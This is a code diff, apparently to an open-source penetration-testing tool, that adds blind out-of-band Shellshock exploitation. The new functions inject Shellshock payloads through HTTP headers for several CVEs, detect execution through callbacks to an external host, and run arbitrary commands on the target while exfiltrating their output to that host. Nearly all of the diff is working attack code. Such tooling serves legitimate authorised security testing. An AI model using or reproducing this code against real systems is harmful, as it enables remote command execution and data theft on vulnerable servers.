@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import re
+import time
 import string
 import random
 from src.thirdparty.six.moves import urllib as _urllib
@@ -89,6 +90,67 @@ def _send_header_payload(url, check_header, payload):
   if check_header == settings.USER_AGENT:
     menu.options.agent = default_user_agent
   return response
+
+"""
+Probe every header and CVE through the out-of-band channel, then wait once for the whole sweep.
+"""
+def _oob_probe(url, testable_headers):
+  from src.core.injections.blind.techniques.oob import oob_payloads as oob_payloads
+
+  channel = checks.init_oob_channel()
+  if channel is None:
+    return None, None
+  for transport in oob_payloads.transports():
+    fired = []
+    sent = {}
+    for check_header in testable_headers:
+      for cve in shellshock_cves:
+        token, hostname = channel.new_payload()
+        # A header is not URL-decoded, so the sum goes in with a literal plus. The attack vector is
+        # a bash one, which needs nothing run ahead of the command for the sum to hold a value.
+        expression, expected, _ = oob_payloads.proof(transport, plus="+")
+        attack_vector = settings.SINGLE_WHITESPACE + "echo; " + oob_payloads.reach_command(transport, hostname, expression) + ";"
+        payload = shellshock_payloads(cve, attack_vector)
+        if settings.VERBOSITY_LEVEL != 0:
+          settings.print_data_to_stdout(settings.print_payload(payload))
+        _send_header_payload(url, check_header, payload)
+        sent[token] = payload
+        fired.append((token, check_header, cve, expected))
+
+    deadline = time.time() + settings.OOB_TIMEOUT
+    while time.time() < deadline:
+      for token, check_header, cve, expected in fired:
+        if checks.oob_proof_holds(channel.seen(token, protocol=oob_payloads.required_protocol(transport)), expected):
+          settings.OOB_TRANSPORT = transport
+          settings.SHELLSHOCK_OOB = True
+          return check_header, cve, sent[token]
+      time.sleep(1)
+  return None, None, ""
+
+"""
+Run a command through the out-of-band channel and read its output back.
+"""
+def _oob_cmd_exec(url, cmd, cve, check_header):
+  from src.core.injections.blind.techniques.oob import oob_payloads as oob_payloads
+
+  channel = settings.OOB_CHANNEL
+  if channel is None:
+    return ""
+  token, hostname = channel.new_payload()
+  # A header is not URL-decoded, so the pipe goes in literally.
+  command = oob_payloads.exfil_command(settings.OOB_TRANSPORT, hostname, cmd, pipe="|")
+  if not command:
+    return ""
+  attack_vector = settings.SINGLE_WHITESPACE + "echo; " + command + ";"
+  payload = shellshock_payloads(cve, attack_vector)
+  if settings.VERBOSITY_LEVEL != 0:
+    settings.print_data_to_stdout(settings.print_payload(payload))
+  _send_header_payload(url, check_header, payload)
+  for interaction in channel.wait_for(token, settings.OOB_TIMEOUT, protocol="http"):
+    body = checks.oob_request_body(interaction.raw_request)
+    if body:
+      return body.rstrip("\r\n")
+  return ""
 
 """
 Build the shared execute_cmd(cmd) -> output callback, logging execution only when asked to.
@@ -221,6 +283,21 @@ def shellshock_handler(url, http_request_method, filename):
           if checks.prompt_keep_testing(url):
             break
 
+    # Nothing echoed back, so try the out-of-band channel - a blind sink reflects no marker.
+    if no_result and menu.options.oob:
+      testable = [_ for _ in settings.SHELLSHOCK_HTTP_HEADERS if _header_testable(_)]
+      check_header, cve, payload = _oob_probe(url, testable)
+      if check_header:
+        no_result = False
+        settings.DETECTION_PHASE = False
+        settings.EXPLOITATION_PHASE = True
+        vuln_parameter = check_header
+        settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + "HTTP Header"
+        settings.HTTP_HEADER = check_header
+        checks.announce_vulnerable_finding(filename, settings.INJECTION_TYPE.BLIND, technique, settings.SINGLE_WHITESPACE + "HTTP Header", settings.SINGLE_WHITESPACE + check_header, http_request_method, vuln_parameter, payload, counter, decode_payload=False)
+        session_handler.import_injection_points(url, technique, settings.INJECTION_TYPE.BLIND, filename, "", True, vuln_parameter, "", "", "", False, payload, http_request_method, 0, 0, 0, 0, settings.INJECTION_LEVEL)
+        _post_exploitation(url, cve, check_header, filename, technique, no_result)
+
     if settings.CONFIRMED_INJECTION_POINTS:
       checks.quit(filename, url, hard_exit=False)
     elif no_result == True:
@@ -249,6 +326,9 @@ RESOLVED_CMD_PREFIX = {}
 Execute user commands
 """
 def cmd_exec(url, cmd, cve, check_header, filename):
+
+  if settings.SHELLSHOCK_OOB:
+    return _oob_cmd_exec(url, cmd, cve, check_header)
 
   """
   Check for shellshock 'shell'
